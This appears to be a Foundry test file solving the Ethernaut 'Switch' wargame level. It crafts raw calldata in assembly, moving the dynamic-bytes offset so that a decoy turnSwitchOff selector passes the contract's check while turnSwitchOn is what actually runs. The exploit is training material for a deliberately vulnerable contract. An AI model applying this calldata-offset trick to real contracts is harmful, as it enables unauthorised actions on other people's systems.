// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Switch/SwitchFactory.sol";
import "../src/Ethernaut.sol";

contract SwitchTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testSwitcHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        SwitchFactory switchFactory = new SwitchFactory();
        ethernaut.registerLevel(switchFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(switchFactory);
        Switch ethernautSwitch = Switch(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes32 offSelectorData = bytes32(bytes4(keccak256("turnSwitchOff()")));
        bytes32 onSelectorData = bytes32(bytes4(keccak256("turnSwitchOn()")));
        bytes memory switchCalldata = new bytes(4 + 5 * 32);

        assembly {
            mstore(add(switchCalldata, 0x20), flipSelector)
            mstore(add(switchCalldata, 0x24), 0x0000000000000000000000000000000000000000000000000000000000000060)
            mstore(add(switchCalldata, 0x44), 0x0000000000000000000000000000000000000000000000000000000000000004)
            mstore(add(switchCalldata, 0x64), offSelectorData)
            mstore(add(switchCalldata, 0x84), 0x0000000000000000000000000000000000000000000000000000000000000004)
            mstore(add(switchCalldata, 0xa4), onSelectorData)
        }
        (bool success,) = address(ethernautSwitch).call(switchCalldata);
        require(success, "call failed :(");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
